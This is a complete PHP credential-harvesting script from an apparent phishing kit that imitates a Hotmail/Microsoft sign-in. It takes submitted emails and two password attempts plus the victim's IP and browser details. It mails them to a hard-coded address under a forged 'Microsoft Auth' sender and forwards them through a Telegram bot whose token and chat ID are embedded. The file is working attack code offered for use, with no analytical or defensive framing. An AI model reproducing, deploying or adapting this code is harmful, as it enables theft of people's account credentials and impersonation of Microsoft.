<?php

$recipient_email = "tag100@mailfence.com"; // Change to your receiving email
$telegram_bot_token = "7594602249:AAHXtpmqcu4ONanYKOkn4AixALhln7bmGn4";    // Bot token
$telegram_chat_id = "7724482403";        // Telegram chat ID
$user_ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date("Y-m-d H:i:s");
$email          = isset($_POST['email']) ? trim($_POST['email']) : '';
$firstPassword  = isset($_POST['firstPassword']) ? trim($_POST['firstPassword']) : '';
$password       = isset($_POST['password']) ? trim($_POST['password']) : '';


if (empty($email) || (empty($firstPassword) && empty($password))) {
    http_response_code(400);
    exit("Invalid input.");
}


$msg = "HotmailFresh Login Attempt \n";
$msg .= "E: $email\n";
if (!empty($firstPassword)) $msg .= "P1: $firstPassword\n";
if (!empty($password))      $msg .= "P2: $password\n";
$msg .= "IP: $user_ip\n";
$msg .= "Agent: $user_agent\n";
$msg .= "Time: $timestamp";


$subject = "HotmailFresh Login | $email";
$headers = "From: Microsoft Auth <mox-hot-snail@noreply.microsoft.com>\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
mail($recipient_email, $subject, $msg, $headers);


$telegram_url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";
$telegram_data = [
    'chat_id' => $telegram_chat_id,
    'text'    => $msg,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($telegram_data)
    ]
];
$context  = stream_context_create($options);
file_get_contents($telegram_url, false, $context);


http_response_code(200);
echo "OK";
?>
